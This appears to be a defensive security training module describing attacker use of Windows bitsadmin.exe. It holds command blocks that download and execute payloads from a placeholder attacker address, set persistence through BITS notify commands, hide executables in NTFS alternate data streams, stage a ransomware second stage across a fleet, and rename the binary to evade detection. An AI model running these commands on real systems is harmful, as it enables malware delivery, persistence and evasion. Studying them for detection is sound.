# LOLBins — bitsadmin.exe — Hands-On Use Cases

Every scenario below issues its commands through `bitsadmin.exe`, but per `01 - Overview.md`'s How It Works section, the actual transfer and any notify-triggered execution happen inside the **BITS service** (`svchost.exe -k netsvcs -s BITS`), not inside `bitsadmin.exe` itself. Command syntax is verified against Microsoft Learn's per-switch reference pages and the [LOLBAS Project's `Bitsadmin.yml`](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml). MITRE ATT&CK ID(s) are tagged per scenario.

## Contents
- [Baseline File Download via the Full Job Lifecycle](#baseline-file-download-via-the-full-job-lifecycle)
- [One-Shot Synchronous Download via /transfer](#one-shot-synchronous-download-via-transfer)
- [Local File Copy](#local-file-copy)
- [Persistence via SetNotifyCmdLine](#persistence-via-setnotifycmdline)
- [Immediate Execution via SetNotifyCmdLine](#immediate-execution-via-setnotifycmdline)
- [Payload Hidden in an Alternate Data Stream](#payload-hidden-in-an-alternate-data-stream)
- [SMB-Sourced Transfer](#smb-sourced-transfer)
- [Low-Priority Throttled Transfer](#low-priority-throttled-transfer)
- [Resuming a Job Across Reboot / Logoff-Logon](#resuming-a-job-across-reboot--logoff-logon)
- [Chained Download-Then-Execute One-Liner](#chained-download-then-execute-one-liner)
- [Fleet-Wide Mass Use](#fleet-wide-mass-use)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)
- [Legitimate-Baseline Contrast](#legitimate-baseline-contrast)

---

## Baseline File Download via the Full Job Lifecycle

**MITRE ATT&CK:** [T1197](https://attack.mitre.org/techniques/T1197/) (BITS Jobs), [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```cmd
bitsadmin /create 1
bitsadmin /addfile 1 https://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
bitsadmin /resume 1
bitsadmin /complete 1
```

The canonical four-step lifecycle, verified directly against LOLBAS's documented `Download` technique (`bitsadmin /create 1 & bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe & bitsadmin /RESUME 1 & bitsadmin /complete 1`). `/create` starts the job `SUSPENDED`; `/addfile` attaches the remote/local path pair; `/resume` moves it into the active transfer queue; `/complete` releases the fully-downloaded file to `svc.exe` and finalizes the job to `ACKNOWLEDGED`. No child process is spawned — the file simply appears at the target path once the BITS service finishes.

## One-Shot Synchronous Download via /transfer

**MITRE ATT&CK:** T1197, T1105

```cmd
bitsadmin /transfer myJob https://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
```

The simplest single-line form — `/transfer` creates the job, adds the file, resumes it, and blocks the console until the transfer completes or a critical error occurs, auto-completing the job on success. Per Microsoft's own `/transfer` reference, the default type is `/DOWNLOAD` and the default priority is `NORMAL`. Preferred by operators who want a one-liner without needing four separate invocations, at the cost of the command visibly blocking (and thus appearing) in the console/process-list for the transfer's full duration.

## Local File Copy

**MITRE ATT&CK:** T1105

```cmd
bitsadmin /create 1
bitsadmin /addfile 1 C:\Windows\System32\cmd.exe C:\Data\playfolder\cmd.exe
bitsadmin /resume 1
bitsadmin /complete 1
bitsadmin /reset
```

Verified against LOLBAS's `Copy` technique — both the "remote" and local paths are local filesystem paths rather than a URL, repurposing the transfer job as a local file-copy primitive (e.g. staging a copy of a legitimate system binary like `cmd.exe` under a different name/location for a subsequent masquerading step). The trailing `/reset` cancels any other jobs left in the current user's queue, a cleanup step LOLBAS includes in this exact technique.

## Persistence via SetNotifyCmdLine

**MITRE ATT&CK:** T1197 (Persistence, Defense Evasion)

```cmd
bitsadmin /create updateSvc
bitsadmin /addfile updateSvc https://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
bitsadmin /SetNotifyFlags updateSvc 3
bitsadmin /SetNotifyCmdLine updateSvc C:\Users\Public\svc.exe NULL
bitsadmin /resume updateSvc
```

The persistence pattern this note's red-flag principle is built around. `/SetNotifyFlags ... 3` registers the job to fire its notify command on **either** successful transfer or an error state — meaning the payload can execute both on the "happy path" (download succeeds, notify command runs) and after an induced/incidental failure, without the operator needing to predict which. `/SetNotifyCmdLine` then points at the downloaded payload itself. Because the job persists in the BITS queue (service-managed, survives reboots, subject to the 90-day inactivity ceiling documented in `01 - Overview.md`), this gives an operator delayed or recurring code execution without a scheduled task, a run key, or a service of their own — the "service" doing the persisting is BITS's own job store.

## Immediate Execution via SetNotifyCmdLine

**MITRE ATT&CK:** [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution)

```cmd
bitsadmin /create 1
bitsadmin /addfile 1 C:\Windows\System32\cmd.exe C:\Data\playfolder\cmd.exe
bitsadmin /SetNotifyCmdLine 1 C:\Data\playfolder\cmd.exe NULL
bitsadmin /resume 1
```

Verified against LOLBAS's `Execute` technique, mapped to T1218 rather than T1197 there since the point isn't long-term persistence — it's using the notify-command mechanism as a one-shot execution proxy, immediately after the (local, near-instant) copy completes. LOLBAS's own description: "Execute binary file specified. Can be used as a defensive evasion." The distinguishing factor from the persistence use case above is intent and job lifetime, not syntax — the two techniques share the same underlying mechanism.

## Payload Hidden in an Alternate Data Stream

**MITRE ATT&CK:** [T1564.004](https://attack.mitre.org/techniques/T1564/004/) (Hide Artifacts: NTFS File Attributes), T1197

```cmd
bitsadmin /create 1
bitsadmin /addfile 1 C:\Windows\System32\cmd.exe C:\Data\playfolder\cmd.exe
bitsadmin /SetNotifyCmdLine 1 C:\Data\playfolder\1.txt:cmd.exe NULL
bitsadmin /resume 1
bitsadmin /complete 1
```

Verified verbatim against LOLBAS's `Alternate Data Streams` technique. The notify command's target is `1.txt:cmd.exe` — an NTFS Alternate Data Stream on an otherwise innocuous-looking `1.txt`. A normal directory listing shows only `1.txt`'s own (likely small or zero) size; the executable content hidden in the named stream doesn't appear unless specifically enumerated (`Get-Item -Stream *` or `dir /r`). Combines ADS concealment with the delayed/persistent notify-trigger execution from the two scenarios above.

## SMB-Sourced Transfer

**MITRE ATT&CK:** T1197, T1105

```cmd
bitsadmin /create 1
bitsadmin /addfile 1 \\fileserver01\share\update.exe C:\Users\Public\svc.exe
bitsadmin /resume 1
bitsadmin /complete 1
```

Per Microsoft's own [Life Cycle of a BITS Job](https://learn.microsoft.com/en-us/windows/win32/bits/life-cycle-of-a-bits-job) documentation, a job's remote file name "must use the HTTP, HTTPS, or SMB protocol" — meaning an operator who's already landed inside a domain environment can stage a payload on any reachable file share and pull it via BITS with **zero outbound Internet traffic**, defeating any hunt or control keyed purely on HTTP(S) egress. This variant is easy to miss precisely because most public write-ups on `bitsadmin` abuse focus on the HTTP download case.

## Low-Priority Throttled Transfer

**MITRE ATT&CK:** T1197, T1105

```cmd
bitsadmin /create 1
bitsadmin /addfile 1 https://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
bitsadmin /SetPriority 1 LOW
bitsadmin /resume 1
bitsadmin /complete 1
```

`/SetPriority` accepts `FOREGROUND`, `HIGH`, `NORMAL`, or `LOW` (Microsoft's documented values, verified against the `/SetPriority` reference page). A `LOW`-priority job transfers only using genuinely idle bandwidth and is preempted by every other priority level — an operator's deliberate choice when the goal is a transfer that never shows up as a conspicuous bandwidth spike, at the cost of an unpredictable, potentially much longer completion time.

## Resuming a Job Across Reboot / Logoff-Logon

**MITRE ATT&CK:** T1197

```cmd
:: Session 1 — stage the job and leave it suspended/queued
bitsadmin /create longHaul
bitsadmin /addfile longHaul https://198.51.100.7/stage2.exe C:\Users\Public\stage2.exe
bitsadmin /SetNotifyCmdLine longHaul C:\Users\Public\stage2.exe NULL
bitsadmin /resume longHaul

:: ... host reboots, or the user logs off and back on ...

:: Session 2 (or an automated logon) — job is still present, no re-creation needed
bitsadmin /list /verbose
```

Demonstrates the persistence property directly: the job was created once, and it survives independently of the process, and even the logon session, that created it — subject to Microsoft's documented constraint that a job only makes progress while its owning user has an active local logon or network connection, and the overall 90-day `JobInactivityTimeout` ceiling. An operator relying on this for durable persistence needs the target account to log back in periodically, which is a real limitation worth weighing against a scheduled task or service, but the tradeoff is that nothing about this technique touches the Run keys, Scheduled Tasks, or Services hives that a defender's persistence sweep usually checks first.

## Chained Download-Then-Execute One-Liner

**MITRE ATT&CK:** T1105, [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Command and Scripting Interpreter: Windows Command Shell)

```cmd
bitsadmin /transfer getPayload https://198.51.100.7/beacon.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe
```

The download-and-run compound, using `/transfer`'s synchronous blocking behavior so the `&&`-chained execution only fires once the file has actually landed — the same delivery role `certutil.exe -urlcache -f ... && ...` plays in [`LOLBins/certutil/02 - Hands-On Use Cases.md`](<../certutil/02 - Hands-On Use Cases.md>)'s equivalent scenario, and interchangeable with it in a broader attack chain when an operator wants to diversify which LOLBIN carries the download step.

## Fleet-Wide Mass Use

**MITRE ATT&CK:** T1197, T1105

```cmd
:: Issued identically across many already-compromised hosts via C2 tasking
:: or a GPO immediate task
bitsadmin /transfer ransomStage2 https://198.51.100.7/stage2.exe C:\Windows\Temp\upd.exe && C:\Windows\Temp\upd.exe
```

The same one-shot download-then-run pattern, pushed near-simultaneously to many hosts — common in the pre-detonation staging phase of a ransomware intrusion, or anywhere an operator needs the same second-stage tool present across an entire already-compromised fleet at once. The fleet-level signal is many hosts each independently generating matching BITS-Client operational events and/or a matching downloaded-file hash within a tight time window — see the fleet-wide sweep block in `05 - Detection and Hunting.md`.

## Renamed or Relocated Binary

**MITRE ATT&CK:** [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities), plus whichever BITS technique it's paired with

```cmd
copy C:\Windows\System32\bitsadmin.exe C:\Users\Public\svchost_update.exe
C:\Users\Public\svchost_update.exe /transfer x https://198.51.100.7/beacon.exe C:\Users\Public\svc.exe
```

Not a LOLBAS-documented technique specifically for this binary, but the same general masquerading logic covered for `certutil.exe` in this module applies equally here: copying the legitimate signed binary under a different name/path defeats a detection rule keyed purely on `Image` = `bitsadmin.exe` at `System32`/`SysWOW64` — LOLBAS's `Full_Path` listing names exactly those two directories as the only legitimate install locations. Authenticode/`OriginalFileName` checks still identify the underlying binary as Microsoft-signed `bitsadmin.exe` even when renamed. Note that renaming `bitsadmin.exe` itself does nothing to hide the resulting **BITS job** — the job still runs inside the same `svchost.exe -k netsvcs -s BITS` service host regardless of what the client that created it was called, which is why the argument-shape and BITS-Client-log signals in `05 - Detection and Hunting.md` outrank this one.

## Legitimate-Baseline Contrast

Not an attack — included so an analyst can recognize the noise floor this technique has to hide in:

```cmd
:: Windows Update and WSUS both use BITS jobs under the hood for update payload delivery
:: Many enterprise software-deployment tools (SCCM among them) also use the BITS API directly
bitsadmin /list /verbose
```

A large fraction of "normal" BITS-service activity on any managed Windows estate is Windows Update, WSUS, or a deployment tool doing exactly what BITS was built for — legitimate jobs typically show a Microsoft/organizational-update source URL, a system or well-known service-account owner, and **no** `SetNotifyCmdLine` pointed at a script interpreter or an unexpected binary. This is the baseline a `SetNotifyCmdLine`-focused hunt has to distinguish itself from; see the Hunting Priority table in `05 - Detection and Hunting.md`.
